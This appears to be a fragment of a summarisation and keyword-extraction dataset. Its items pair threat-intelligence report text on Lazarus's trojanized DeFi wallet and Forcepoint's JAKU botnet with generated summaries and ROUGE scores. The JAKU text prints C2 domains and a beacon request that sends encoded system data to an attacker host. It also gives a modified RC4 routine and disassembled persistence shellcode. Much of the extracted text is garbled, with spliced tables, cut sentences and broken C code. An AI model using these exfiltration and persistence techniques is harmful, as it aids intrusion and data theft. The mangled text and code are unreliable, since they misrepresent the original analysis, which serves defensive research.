ATT&CK MappingThis table contains all the TTPs identified in the analysis of the activity described in this report.Tactic ExecutionPersistenceDefense EvasionDiscoveryTechnique Technique Name T1204.002 User Execution: Malicious File T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderUse Trojanized application to drop malicious backdoorRegister dropped backdoor to the Run registry key Indicator Removal on Host: File Deletion The Trojanized application overwrites itself after creating a legitimate application to remove its traceT1070.004T1070.006 Indicator Removal on Host: TimestompT1057T1082T1083 T1124Backdoor capable of timestomping specific files Process Discovery List running processes with backdoor System Information Discovery Gather IP address, computer name, OS version, and CPU architecture with backdoor File and Directory Discovery List files in some directories with backdoor System Time Discovery7/8Command and ControlExfiltrationT1041Gather system information with backdoorUse HTTP as C2 channel with backdoorT1071.001 Application Layer Protocol: Web Protocols T1573.001 Encrypted Channel: Symmetric Cryptography Use RC4 encryption and base64 with backdoor Exfiltration Over C2 Channel Exfiltrates gathered data over C2 channels with backdoor[1] url [2] APT Intel report: Lazarus Covet Covid19 Related IntelligenceBackdoor ", "generated_text": "malware; Lazarus; November 2021; a legitimate application; DeFi Wallet; a malicious file; a malicious file; the malware; the malicious application; the malware; the malware; the malware; the backdoor; capabilities; Control; the compromised server; South Korea; the attackers; the malware; the malware; the campaign; the attackers; the infrastructure; the attackers; a cryptocurrency wallet; the malware; a malicious file; the attack; the malware; the attackers; compromise; the Trojanized application; an infection scheme; the malware; the initial infection; stage; The configuration; Flags; C2 server addresses; Victim Identification Value; time; the malware; the C2 servers; the malware; the C2 server.", "ref_text": "<START-1>The cybercriminal group Lazarus has been trojanizing decentralized finance (DeFi) applications to deliver malware and gain financial profits. Researchers discovered a trojanized DeFi wallet app compiled in November 2021 that implants a backdoor when executed. The backdoor allows full control of the compromised system. The infection starts with a trojanized installer that drops the next-stage backdoor and a legitimate DeFi wallet app. It launches the backdoor, overwriting itself with the legitimate app to cover its tracks. The backdoor disguises itself as Google Chrome and connects to command and control servers, receiving directives to gather system info, download files, and control the victim's machine. The Trojanized application gets removed from the disk, allowing it to cover its tracks. The malware uses encrypted HTTP requests to communicate with multistage command servers hosted on compromised South Korean websites. Analysis of a command script shows overlaps with previous Lazarus malware, like CookieTime/LCPDot. The backdoor functionality and infrastructure links it to Lazarus campaigns targeting the defense industry. Lazarus continues to evolve techniques to compromise cryptocurrency and blockchain businesses, drawn by financial profits as the industry grows. The report details indicators of compromise and ATT&CK techniques used by the malware. It highlights the ongoing threat Lazarus poses to the cryptocurrency sector through trojanized apps and sophisticated backdoors for control and data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.24444444444444444, "t5/word/hint_hit_recall": 0.08333333333333333, "gpt3/lexical/rouge_rouge1": 0.488888888888889, "gpt3/lexical/rouge_rouge2": 0.18435754189944134, "gpt3/lexical/rouge_rougeL": 0.2444444444444445, "gpt3/lexical/rouge_rougeLsum": 0.2444444444444445, "gpt3_generated_text": ["In November 2021, the Lazarus threat actor targeted the financial industry with a Trojanized DeFi application. The application, known as DeFi Wallet, contained both a legitimate program for managing a cryptocurrency wallet and a malicious file that served as a full-featured backdoor for controlling compromised victims. The malware operator exclusively used compromised web servers in South Korea for this attack, with infrastructure set up in multiple stages. The infection scheme involved tricking victims into executing the Trojanized application, which then installed the malware and overwrote the legitimate application to cover its tracks. The malware had capabilities to gather information, communicate with C2 servers, and control the compromised server. The configuration of the malware included flags, C2 server addresses, victim identification values, and time values. This campaign highlighted the evolving tactics of the Lazarus group in targeting the cryptocurrency business."]}, {"split_name": "val", "sample_id": "val_123", "prompt_text": "Extract the keywords: TLP-WHITE | 1TABLE OF CONTENTSExecutive Summary 4 Technical Analysis 6 Unique Victim Computer 6 Victims by Languages 6 Victims by Country 7 Victims per Time-zone 8 Victims by Network Provider 9 Victims by Population 10 Counterfeit Windows Installations 12 Malware Version Numbering 12 Total Number of JAKU Victims 13 C2 Servers Locations and Victims 14 C2 Data Sets 15 Total Number of JAKU Victims per C2 Server 16 Mapping Victim Locations 17 Americas and European Coverage 18 Korean and Japanese Coverage 19 Russian Coverage 20 Static and Behavioural Analysis 21 Malware Stage 1 \u2013 Poisoned Bit Torrent 21 Stage 1 Behaviour 21 Windows Update 21 Reconnaissance 21 Calling Home 22 Awaiting Orders 22 Malware Stage 2 \u2013 Fake PNG Files 23 Encryption Algorithm 23 Bad Crypto 24 Compression Algorithm 24 Malware Stage 2 \u2013 R2D3 25 Stealth Injection 25 AV Engine Detection 25 Service Installation 25 Malware Configuration 29 Malware Stage 2 \u2013 C3PRO-RACCOON 30 C3PRO 30 DNS Command Channel 32 Observations on C3PRO-RACCOON 34TLP-WHITE | 2UDT Library 34 Secure Delete 34 Unfinished Code 34 Spoofed File Dates 34 Under Development 34 Who is SAPHARUS? 35 SAPHARUS Timeline 35 The Real SAPHARUS 35 Hypothesis #1 - Overwrites 35 Hypothesis #2 - Additions 35 SAPHARUS at Forcepoint 35 Diversity of Addresses 35 Truncated System Information 35 C2 Telemetry Databases 36 SQLite Databases 36 Near.jpg 36 HISTORY Table 37 CHILD Table 38 INFO Column Commands 38 Parting Thoughts for the Reader 43 An Exercise to the Reader 43 Why JAKU? 43 References 44TLP-WHITE | 3EXECUTIVE SUMMARYJAKU is the name given to the investigation, surveillance and analysis, by the Forcepoint Special Investigations team, of an on-going botnet campaign.Organised crime has been operating botnets for several years and the term itself has been in common parlance for over a decade. While JAKU may not answer all the questions regarding botnets, it does offer some insight and understanding into the inner workings of a botnet. JAKU also sheds some light onto the victims of botnets, why they are vulnerable, and possibly, why they are targeted.What JAKU demonstrates is the re-use of Infrastructure, Tools, Techniques and Processes (TTPs), as well as the herding of victims into separate groupings; some indiscriminate and others highly targeted. Both the herding of general botnet victims and highly targeted attacks on individuals and organisations is hardly surprising. What is somewhat of a step change, however, is the execution of a number of concurrent operations within a campaign, using almost identical TTPs, to both herd thousands of victims into becoming botnet members while at the same time executing a targeted operation on a very small number of individuals.Within the noise of thousands of seemingly indiscriminate botnet victims, the JAKU campaign performs a separate, highly targeted operation.Forcepoint Security Labs has identified the precision targeting and tracking of a small number of individuals of various nationalities. These individuals include members of International Non- Governmental Organisations (NGOs), Engineering Companies, Academics, Scientists and Government Employees. North Korea (DPRK) and Pyongyang are the common theme shared between these individuals.Because of the sensitivity of this part of the investigation, only the technical details of the \u2018RED-RACOON\u2019 operation are contained within this report and Law Enforcement and Government Agencies have been informed.This paper examines how the JAKU botnets are constructed and identifies their characteristics, and in the case of the targeted attacks, how they differ from the scattergun attacks of broader botnet activities. This study also highlights the consequences that Internet users who disregard copyrights and digital rights may face. Many may incur end-point security vulnerabilities that may not only leave them subject to attack, but also may allow their machines to be misused by adversaries, such as the JAKU botnet controllers, to execute information and identity theft.Botnets are an easy form of resilient, redundant and highly pervasive attack infrastructures that are repeatedly deployed by major threat actors, such as organised crime-sponsored attackers and rogue states via their agencies. This resilience is strengthened by what appears to be the herding of victims into smaller bot-networks. This, to some degree at least, ensures that if the botnet is compromised then the remainder of the campaign is left to operate.Finding, tracking and shutting down attack modes and methodologies with such capabilities can be a formidable task. No single organisation can do it alone. It requires the close collaboration and intelligence- sharing activities of both private organisations and government agencies.Fortunately, even before the inception of this investigation in October of 2015, Forcepoint customers enjoyed protection from the threats presented by the malware discussed in this paper by TRITON\u00ae ACE.TLP-WHITE | 4OVERVIEWThe JAKU campaign has clear connections with the TTPs used by the threat actors discussed by Kaspersky in the DARKHOTEL investigations from November 2014. This paper recognises the extensive contributions by Kaspersky in this area and acknowledges their detailed work.What was not in the public domain and has been identified as part of this investigation, are the following:Piracy. The prevalence of users/victims who are running counterfeit installations of Microsoft Windows\u00ae, downloading \u2018warez\u2019 software and using BitTorrent software to illegally obtain these as well as other copyright protected material, such as movies and music.C2 Databases. The use of SQLite files to collate and manage the botnet members, their structure and the use of version numbering.Poisoned BitTorrents. The technique of threat actors deploying torrent files onto torrent sites that are pre- infected with malware has not been widely seen before, especially with respect to BitTorrent-types of attack. This behaviour is difficult to trace and track and is indiscriminate in its infection pattern unless it has some means of targeting desired demographics.Resilient C2 Channels. Stage two of one piece of malware has three inbuilt Command and Control (C2) mechanisms. This level of resilience is not accidental, but rather, such investment and effort is usually indicative of the perceived value of the target.ACKNOWLEDGEMENTSForcepoint would like to thank our colleagues at the UK National Crime Agency (NCA), CERT-UK, KrCERT/CC, Europol and Interpol for their cooperation and assistance in this investigation. Only with a truly interactive approach to collaborative intelligence collection, collation and analysis can we, as an industry, ensure that the Internet is a safe place to do business and conduct our personal lives. Acknowledgement and thanks to our industry partners and peers who have offered their professional insightThanks are due to the following individuals, without their contribution and guidance this document would not have been possible: Pierre Boisrond, David Andreas, Josh Douglas, Carl Leonard, Rajiv Motwani, Eunju Pak, Nigel Roberts, Brian Shirey, Boris Sieklik, Luke Stamp and John Underhill.TLP-WHITE | 5TECHNICAL ANALYSISUnique Victim Computer. The JAKU servers allocate a unique ID (UID) to every victim. The system tracks victims by this UID and records the time that the victim \u2018calls home\u2019 to the botnet command and control server. Over the period from September 2015 to May 2016, in excess of 29,000 unique victims have been recorded by JAKU. However, the prevalence of duplicate entries in the telemetry data (See: SAPHARUS) suggests that a more realistic figure is closer to 19,000.Victims by Languages. The system locale setting within a Windows computer is used to specify the language used when a programme does not understand Unicode characters. In effect, it is the language used by the operator of the computer.The victims of the JAKU campaign are clearly clustered around the Japanese and Korean languages. Korean (43%) and Japanese (30%) make up over 73% of the victim machines, followed by English (13%) and Chinese (10%). The remaining 4% of victims are spread across 27 other languages.LANGUAGEPERCENTAGELANGUAGEPERCENTAGEKoreanJapaneseEnglishChineseFrenchPolishPortugueseSpanish; CastilianGermanItalianTurkishArabicRomanian; Moldavian; MoldovanHungarianCroatianSwedishSerbianDanishThaiCzechRussianLithuanianGreekNorwegianHebrewEstonianFinnishMacedonianPersianDutch; FlemishSlovenian43%30%13%10%1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%<1%TLP-WHITE | 6Victims by Country. The JAKU campaign covers the majority of countries across the world, 134 at the last count. Between September 2015 and May 2016, there were an estimated 19,000 unique victims.Over 87% of victim computers were in one of four countries: South Korea (42%), Japan (31%), China (8%) and the United States (6%). This distribution is consistent with the data from the system locale analysis.Victims per CountryOTHERS, 12%US, 6%CN, 8%KR, 42%JP, 31%COUNTRY PERCENTAGEKR <1%TLP-WHITE | 7Victims per Time-zone. Each of the victim machines has a time-zone setting for the geographic region the system is configured to operate in. The observed distribution of time-zone settings for the victim computers reinforces the bias towards Korea and Japan which both have time-zone offsets of +09:00 (Korea Standard Time, Tokyo Standard Time, and Yakutsk Standard Time) at over 69% of victims.The only other major grouping of victims is the +08:00 time-zone (China Standard Time, Singapore Standard Time, Taipei Standard Time, West Australia Standard Time and North Asia East Standard Time) with 11% of all victims.Victims per Timezone+02:00, 1.08% OTHERS (<1%),3%-06:00, 1.26%GMT, 1.45%+05:30, 1.64%+07:00, 1.88%+01:00, 2.66%-05:00, 2.83%-08:00, 3.53%+08:00, 11.51%+09:00, 69.54%TZ OFFSET-12:00 0.12%TLP-WHITE | 8Victims by Network Provider. All IP addresses are controlled within groupings which are sometimes referred to as routing domains. These routing domains are identified by their Autonomous System Numbers (ASN). For the JAKU victims, there is a broad spread of victims across 1,555 ASNs. There is a clear bias on Korean, Japanese and Chinese providers:NETWORK PROVIDERASNsCOUNTYPERCENTAGEKorea TelecomAS4766Republic of Korea14.91%SK Broadband (Hanaro Telecom Inc.)AS9318Republic of KoreaLG Uplus Corp.(LG DACOM Corporation, LG Powercomm)AS17858 (6.25%) AS3786 (2.13%)Republic of KoreaNTT Communications CorporationKDDI CORPORATIONAS4713AS2516JapanJapanChinanetAS4134People\u2019s Republic of ChinaSoftbank BB Corp.AS17676JapanOTHERS < 2% (1547)7.96%8.38%6.54%4.70%3.73%3.44%50.34%Corporate Victims. Amongst the JAKU victims, the number of corporate victims is significantly low. The proportion of victim computers that are a member of a Microsoft Windows domain rather than workgroups or as standalone systems is less than 1% of the total. This is calculated on just 153 unique victims matching the corporate criteria.Dwell Time. The length of time a botnet victim is infected is referred to as the dwell time. For those identified as corporate victims, the mean dwell time is 93 days, with the maximum observed being 348 days.TLP-WHITE | 9Victims by Population. If the number of unique victims per country is factored against the population of the respective countries, a somewhat different picture emerges. Korea and Japan are still at the top of the target list, but Taiwan and Hong Kong rise, while the US and China drop. What is most striking is the clear bias toward South Korean victims:Victims per Million Population162.10946.23430.80813.709 13.57 11.816.781 PL020406080100120140160180Listed below are those countries with greater than one victim per million of population:COUNTRY VICTIMSCOUNTRYPOPULATION1 VICTIMS/MILLIONKR 90Korea, SouthJapanHong KongTaiwanSingaporeMacau Windows onto a new computer, they use what is known as an OEM product ID (PID). These PIDs can be identified from retail ones as they contain the text, \u201cOEM\u201c. In cases where Windows reports that the \u2018model\u2019 of the computer is \u2018To be filled by O.E.M.\u2019 and the PID contains OEM, it indicates with some reasonable certainty that an OEM product license has been used on non-OEM hardware. In other words, the system is running a counterfeit Microsoft Windows license.With this in mind, the total number of OEM PIDs identified is 12,243. The number of them that appear to be counterfeit is 6,366. For OEM licenses, this indicates that 52% are likely to be counterfeits. It\u2019s reasonable to assume that this ratio can be used to infer the prevalence of counterfeits across all the JAKU victims, i.e. including those with retail PIDs.The likelihood that 52% of computers are actually running counterfeit copies of Microsoft Windows warrants further attention. According to the IDC study, \u201cUnlicensed Software and Cybersecurity Threats\u201d (2015)2: \u201c\u2026a clear link between unlicensed software and cybersecurity threats For enterprises, governments, and consumers, the obvious implication is that one way to lower cybersecurity risks is to reduce the use of unlicensed software.\u201d However, the evidence from JAKU paints a clearer picture: Whereas enterprise and like\u2013sized organizations may well be operating correctly with the licensing of software, there are a sizable number of other businesses and organizations that are not.Within the large number of JAKU victim computers, 75% of Korean machines appear to be running counterfeit Windows; for Japan this figure is 25%. Both these percentages are twice the figure stated in the IDC report, which states that Korea has a piracy rate of 38% and Japan 12%. Not surprisingly, the country with the largest percentage of JAKU victims is China, with 85% of computers being suspected of using counterfeit PIDs. This is even worse than the estimated 74% of machines in China suspected of running counterfeit Windows in the IDC report.Malware Version Numbering. During analysis of the malware and the C2 data sets, a version numbering scheme was identified: within the C2 data sets, almost 60 unique version numbers were present. However, for come and go. But so, too, do the C2 servers for JAKU. Whole sections of the JAKU victim sets go offline because their C2 server has also disappeared. Because the malware used has hard-coded domain names and not IP addresses, the C2 servers can come back on-line with a new IP address and catch up on their existing victims. Why these servers go offline is not always clear. However, it has certainly been observed on at least one occasion that a JAKU server had been compromised by what appeared to be another threat actor wishing to use the server for credit card fraud. This situation, however, did not continue for more than a few being located in Malaysia, Thailand and Singapore:C2IPASNBLACK- SQLite databases by each of the active C2 servers. Each IP address identified has a separate Data Set of browny.ddns.net sweetbrowny.mooo.com cometome.yourtrap.comUNKNOWNbbsbox.strangled.net minicooper.strangled.nettorrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.com torrent.gotgeeks.com torrentfiles.ddns.net movieadd.mooo.com torrent3.bbsindex.comfile2.strangled.net blog3.serveblog.net torent.dnsd.info dns53.ignorelist.com www.bbsupdates.comxa.comUNKNOWNtorrent.dtdns.net decrypt.dnsd.info decrypt.info.tm torrent.serveblog.net decrypt.effers.comboardchk.strangled.net minicooper.ddns.com minicooper.chickenkiller.com cutemini.sexidude.com] REDACTED [UNKNOWNTLP-WHITE | 15Total Number of JAKU Victims per C2 Server. Far more complex figures appear when the number of victims are clustered into their Command and Control (C2) servers and monitored over time. Gaps, such as those illustrated by SAPHARUS, are due to infrastructure problems and servers going offline. Others, such as the YELLOW-BOA disappearance, are far more complex and are possibly due to servers having a take-down notice applied to them by law enforcement.Total Number of JAKU Victims per C2 Server6000500040003000200010000 Oct/2015Nov/2015Dec/2015Jan/2016Feb/2016Mar/2016Apr/2016BLACK-SAPHARUSBROWN-COOPERGREY-THAIYELLOW-BOARED-RACOONGREEN-SOUNDFIXPINK-COWORANGE-HOWLVIOLET-FOXBLUE-MONKEYTLP-WHITE | 16Mapping Victim Locations. By using IP to geo-location database services, it\u2019s possible to plot the location of the JAKU victim machines:TLP-WHITE | 17Americas and European Coverage. North America and Europe feature significant coverage, but South America and Africa only have limited coverage:TLP-WHITE | 18Korean and Japanese Coverage. The predominance of JAKU victim machines being located in South Korea and Japan is clearly illustrated:TLP-WHITE | 19Russian CoverageTLP-WHITE | 20STATIC AND BEHAVIOURAL ANALYSISMALWARE STAGE 1 \u2013 POISONED BIT TORRENTName Dropped by SoundFix.exe (from poisoned movie and TV 11Stage 1 Behaviour. Check HKCU\\CLSID for a default value entry that contains a GUID. This entry is only present if the malware has already generated and added it to the registry. On first run, this registry value will not be present. If the value already existed, it uses the existing GUID. Otherwise, if HKCU\\CLSID does not exist, it generates a new, unique GUID using the CoCreateGUID Windows API. This is then saved under HKCU\\CLSID under the (default) value:Windows Update. As shown in the picture above, the sample also creates two other registry values under the CLSID key. The first one, \"System\", holds the sample's version number; and the second one, \"WindowsUpdate\", contains the current system time.Reconnaissance. The sample executes the following commands in order:date /t dir\"c:\\Program Files\\\" dir\"c:\\Program Files (x86)\\\" dir \"%s\"Where \"%s\" is the directory of both the directory of the user's bookmarks (favourites) and then the directory of the recently opened documents.TLP-WHITE | 21Calling Home. The sample then beacons to its C2 server, including sending the version number, private IP address, GUID and also the encoded system information if the previous registry entries did not already exist. If the registry entries existed already, then only the sample's version number, the GUID and the private IP address are sent. An example of this communication including the system information (&if=) can be seen below:POST url HTTP/1.1 Content-Type: application/x-www-form-urlencoded Accept: */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0 Host: movieadd.mooo.com Content-Length: 15442 Connection: Keep-Alive Pragma: no-cache uid={22CFF683-D866-48AE-9792-073002A23557}&v=11&pi=16843009,&if= upOt@M0b5yPI#9vkUpgm2YAgUMLe5dLa@dOoUduaUMPlzCbk@Cv3UcAB#9En@9za@x5ezsA0@cAgUMLa5pBt5YAnUlAn#xRHz yvwzyPmzCBcUMPnzy5w4dJkUd4aTxfaLMA3#p3bUYA0Ue@34Mvk@pBnTxOt4lAnTCPtzCPJ#x3Izyvj@sAn@xBJzCBnFcAI#x 0m29EQ@xEk#xRkUe@34Mvk@pBnTxOt4nAdUM0V@9AwTxgn2dEwUsfazBAI@xBm@sAkUdEI5xv3zyvj@sAMUM0Wz80BuLv9sLg 8Ko4aUpfa5Cb3zyEo#dk3#MuaUC3t@sXi2sW=The system information is encoded with base64 using the custom alphabet:XAY78BCyz012DEFSuvsKLPx9#@TU456ZabcVW3dejkGHIJtwQRlmnopMfghiNOqrAwaiting Orders. The sample then checks the response to the above request from the server. If the server returns a payload, then the sample will attempt to decrypt and execute it as an executable, and then finish (terminate) execution of itself. The format of these payloads that the sample expects is a fake PNG that contains an encryption key, as documented in the next section. Upon further analysis, the malware has no capability of understanding or executing anything other than this format. If no payload is received, the malware will finish (terminate) execution immediately.TLP-WHITE | 22MALWARE STAGE 2 \u2013 FAKE PNG FILESNot only is the C2 telemetry data held in a file that purports to be a JPEG image file, but the 1st stage malware itself attempts to download and decrypt the 2nd stage in a file that upon first glance appears to be a graphical image. The downloaded file, when examined look like a PNG image file, the headers even conform to the PNG cryptographic and compression algorithms. Subsequently, Forcepoint created a command line utility to decrypt and decompress these fake PNG files.Encryption Algorithm. The encryption algorithm used is a modified RC4 implementation. The file analysed modified RC4 routine was found at offset: 0x0041903C. Forcepoint re-coded this in C as:BOOL rc4(BYTE *buf,int bufsize, BYTE *modkey, int modkeylen)// 0x0041903C { int i, x; byte g = 0; byte j = 0; unsigned char xorIndex; unsigned char tmp; char keydata[257]; char state[257]; if (modkey && modkeylen >= 1) { // Zero out the state and keydata memset(state, 0, sizeof(state)); memset(keydata, 0, sizeof(keydata)); // Initialize the state array with identity permutation (neutral) for (i = 0; i < 256; i++) { state[i] = i; // This is an addition included in the malware // it is an attempt to randomize the permutations in the state array with a modulation key array // But there is a mistake where it's only ever writing to state[2] instead of the // presumably intended state[i]. However, this still results in the permutations being modified // enough to change the rc4 cipher for (i = 0; i < 256; i++) { x = x % modkeylen; state[2] = modkey[x++]; // The permutations in the state array are now morphed/randomized for (i = 0; i < 256; i++) { // Morph the permutations using the key data (which is set to all zeros in this instance) g = (keydata[i] + state[i] + g); // swap some bytes tmp = state[i]; state[i] = state[g]; state[g] = tmp; // process the input dataTLP-WHITE | 23for (i = 0, g = 0, j = 0; i < bufsize; i++) g = (g + 1); j = (state[g] + j); // swap some bytes tmp = state[g]; state[g] = state[j]; state[j] = tmp; // obtain xor index in state array xorIndex = (state[j] + state[g]) & 255; // perform the xor on the current index of the buffer buf[i] ^= state[xorIndex]; }Bad Crypto. The only significant difference to a standard rc4 routine here is the addition of the \u201cfor loop\u201d that is (presumably) meant to randomize the permutations in state[2] with the values from the modulation key. However, it seems that the author made a mistake: instead of each permutation, only the 3rd value in the array is ever modified. Modifying this one byte is still enough to result in a significantly different cipher. Fortunately, with this knowledge, it is trivial to crack the RC4 cipher without knowing the key. This is because it is possible to brute force the 3rd element of the state array, in the knowledge that it can only have 256 possible values.Compression Algorithm. The malware uses the LZ Huffman compression algorithm (lzhuf). Using an open source library such as Mike Smiley's LZH implementation allowed us to successfully extract the 2nd stage malware from the fake PNGs being decrypted.TLP-WHITE | 24MALWARE STAGE 2 \u2013 R2D3 R2D3 is a second stage (fake PNG) malware that employs stealth tactics and AV avoidance. Its primary purpose appears to be to await an encrypted third stage component to execute.Stealth Injection. This second stage malware injects shellcode into a new explorer.exe process every time it wishes to do something significant, such as network traffic, registry, and file execution operations. This is a stealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into the entry point and then terminating the explorer.exe process in the shellcode immediately afterwards.AV Engine Detection. The malware checks whether Bitdefender is installed by checking for the mutex \"BDAgent-oneinstance-mutex\" via the CreateMutexA API. It then checks if AVG is installed by looking for an event named \"AVG{53036606-6F17-41a9-80DD-AB930D6BA4DD}\" via the CreateEventA API. If either of these exists, the malware will terminate execution.Service Installation. So long as AVG and Bitdefender are not detected, the malware will copy itself to %COMMONPROGRAMFILES%\\CompSvc.exe. It also creates the file %COMMONPROGRAMFILES%\\SvcStart.exe, which is embedded within the malware. It then injects shellcode into a new explorer.exe in order to execute SvcStart.exe with the following command line:SvcStart.exe R2D2 C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.extWhere \"C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.ext\" is the location of the original malware file.Analysis indicates that there are two command line prefixes:R2D2: Terminates the currently running malware, deletes it from hard-disk and then executes the newly copied version in the common program files directory.R2D3: Does not require a directory to be given in the command line string and results in SvcStart.exe dropping a batch file named exp.bat in the %TEMP% directory, which simply cleans up all of the malware as below::REPEAT DEL %1 IF EXIST %1 GOTO REPEAT DEL %2TLP-WHITE | 25The R2D2 command line is the only one seen used during live analysis, whereas R2D3 appears to be a clean- up function. When the R2D2 command line is used, SvcStart.exe executes the newly created CompSvc.exe, which will check if it is running from the common program files directory. If this is the case, it will inject shellcode into a new explorer.exe in order to install a persistence key via the Microsoft Active Setup registry key location with a custom GUID:.data:0044B114 pRegistryShellCode: ; DATA XREF: sub_41BA5C+5Bo.data:0044B114 push ebp.data:0044B115 mov ebp, esp.data:0044B117 sub esp, 314h.data:0044B11D push ebx.data:0044B11E xor ebx, ebx.data:0044B120 cmp [ebp-8], ebx.data:0044B123 push esi.data:0044B124 mov esi, 12345678h.data:0044B129 jz short loc_44B130.data:0044B12B mov esi, 87654321h.data:0044B130.data:0044B130 loc_44B130: ; CODE XREF: .data:0044B129j.data:0044B130 push edi.data:0044B131 push 40h.data:0044B133 pop ecx.data:0044B134 xor eax, eax.data:0044B136 lea edi, [ebp-10Bh].data:0044B13C mov [ebp-10Ch], bl.data:0044B142 rep stosd.data:0044B144 stosw.data:0044B146 stosb.data:0044B147 push 40h.data:0044B149 xor eax, eax.data:0044B14B pop ecx.data:0044B14C lea edi, [ebp-20Fh].data:0044B152 mov [ebp-210h], bl.data:0044B158 push 40h.data:0044B15A rep stosd.data:0044B15C stosw.data:0044B15E stosb.data:0044B15F pop ecx.data:0044B160 xor eax, eax.data:0044B162 lea edi, [ebp-313h].data:0044B168 mov [ebp-314h], bl.data:0044B16E rep stosd.data:0044B170 stosw.data:0044B172 push 8003h.data:0044B177 mov [ebp-4], ebx.data:0044B17A stosb.data:0044B17B call dword ptr [esi+2Ch] ; kernel32.SetErrorMode.data:0044B17E lea eax, [esi+344h].data:0044B184 push eax.data:0044B185 call dword ptr [esi+20h] ; GetModuleHandleA(\"ntdll.dll\").data:0044B188 mov edi, eax.data:0044B18A lea eax, [esi+354h].data:0044B190 push eax.data:0044B191 push edi.data:0044B192 call dword ptr [esi+24h] ; GetProcAddress(\"strlen\").data:0044B195 mov [ebp-8], eax.data:0044B198 lea eax, [esi+374h].data:0044B19E push eax.data:0044B19F push edi.data:0044B1A0 call dword ptr [esi+24h] ; GetProcAddress(\"strcpy\").data:0044B1A3 mov edi, eax.data:0044B1A5 lea eax, [esi+34h].data:0044B1A8 push eax.data:0044B1A9 lea eax, [ebp-10Ch].data:0044B1AF push eax.data:0044B1B0 call edi ; ntdll.strcpy.data:0044B1B2 lea eax, [esi+138h].data:0044B1B8 push eax.data:0044B1B9 lea eax, [ebp-210h].data:0044B1BF push eax.data:0044B1C0 call edi ; ntdll.strcpy.data:0044B1C2 lea eax, [esi+23Ch].data:0044B1C8 push eax.data:0044B1C9 lea eax, [ebp-314h].data:0044B1CF push eax.data:0044B1D0 call edi ; ntdll.strcpy.data:0044B1D2 add esp, 18h.data:0044B1D5 cmp dword ptr [esi+340h], 1.data:0044B1DC lea eax, [ebp-4].data:0044B1DF pop edi.data:0044B1E0 push eaxTLP-WHITE | 26.data:0044B1E1 lea eax, [ebp-10Ch].data:0044B1E7 push eax.data:0044B1E8 push dword ptr [esi+30h].data:0044B1EB jnz short loc_44B235 ; RegOpenKeyA.data:0044B1ED call dword ptr [esi+4] ; RegOpenKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1-7D22-4f20-ADA2-3901BD61DDE4}\").data:0044B1F0 test eax, eax.data:0044B1F2 jz short loc_44B20C.data:0044B1F4 lea eax, [ebp-4].data:0044B1F7 push eax.data:0044B1F8 lea eax, [ebp-10Ch].data:0044B1FE push eax.data:0044B1FF push dword ptr [esi+30h].data:0044B202 call dword ptr [esi] ; RegCreateKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1-7D22-4f20-ADA2-3901BD61DDE4}\").data:0044B204 test eax, eax.data:0044B206 jnz loc_44B291.data:0044B20C.data:0044B20C loc_44B20C: ; CODE XREF: .data:0044B1F2j.data:0044B20C lea eax, [ebp-314h].data:0044B212 push eax.data:0044B213 call dword ptr [ebp-8] ; ntdll.strlen.data:0044B216 pop ecx.data:0044B217 push eax.data:0044B218 lea eax, [ebp-314h].data:0044B21E push eax.data:0044B21F push 1.data:0044B221 lea eax, [ebp-210h].data:0044B227 push ebx.data:0044B228 push eax.data:0044B229 push dword ptr [ebp-4].data:0044B22C call dword ptr [esi+8] ; RegSetValueExA(\"C:\\\\Program Files\\\\Common Files\\\\Services\\\\SvcStart.exe\").data:0044B22F test eax, eax.data:0044B231 jnz short loc_44B28B.data:0044B233 jmp short loc_44B283.data:0044B235 ; ---------------------------------------------------------------------------.data:0044B235.data:0044B235 loc_44B235: ; CODE XREF: .data:0044B1EBj.data:0044B235 call dword ptr [esi+4] ; RegOpenKeyA.data:0044B238 test eax, eax.data:0044B23A jnz short loc_44B291.data:0044B23C lea eax, [ebp-210h].data:0044B242 push eax.data:0044B243 call dword ptr [ebp-8] ; ntdll.strlen.data:0044B246 test eax, eax.data:0044B248 pop ecx.data:0044B249 jnz short loc_44B26C.data:0044B24B push dword ptr [ebp-4].data:0044B24E call dword ptr [esi+14h] ; RegCloseKey.data:0044B251 lea eax, [ebp-10Ch].data:0044B257 push eax.data:0044B258 push dword ptr [esi+30h].data:0044B25B call dword ptr [esi+0Ch] ; RegDeleteKeyA.data:0044B25E test eax, eax.data:0044B260 jnz short loc_44B291.data:0044B262 push 0C8h.data:0044B267 call dword ptr [esi+28h] ; ExitProcess.data:0044B26A jmp short loc_44B291.data:0044B26C ; ---------------------------------------------------------------------------.data:0044B26C.data:0044B26C loc_44B26C: ; CODE XREF: .data:0044B249j.data:0044B26C lea eax, [ebp-210h].data:0044B272 push eax.data:0044B273 push dword ptr [ebp-4].data:0044B276 call dword ptr [esi+10h] ; RegDeleteValueA.data:0044B279 test eax, eax.data:0044B27B jnz short loc_44B28B.data:0044B27D push dword ptr [ebp-4].data:0044B280 call dword ptr [esi+14h] ; RegCloseKey.data:0044B283.data:0044B283 loc_44B283: ; CODE XREF: .data:0044B233j.data:0044B283 push 0C8h.data:0044B288 call dword ptr [esi+28h] ; ExitProcess.data:0044B28B.data:0044B28B loc_44B28B: ; CODE XREF: .data:0044B231j.data:0044B28B ; .data:0044B27Bj.data:0044B28B push dword ptr [ebp-4].data:0044B28E call dword ptr [esi+14h] ; RegCloseKey.data:0044B291.data:0044B291 loc_44B291: ; CODE XREF: .data:0044B206j.data:0044B291 ; .data:0044B23Aj data:0044B291 push 64h.data:0044B293 call dword ptr [esi+28h] ; ExitProcess.data:0044B296 pop esi.data:0044B297 xor eax, eaxTLP-WHITE | 27.data:0044B299 pop ebx.data:0044B29A leave.data:0044B29B retnWinpcap. After the shellcode is injected, the malware will load the winpcap npf.sys driver if it exists. It then begins to monitor all network adapters in order to determine which interface is the primary adapter that can access the internet. Then, it makes a POST request to the C2 server with gzip compressed system Content-Type: multipart/form -data; 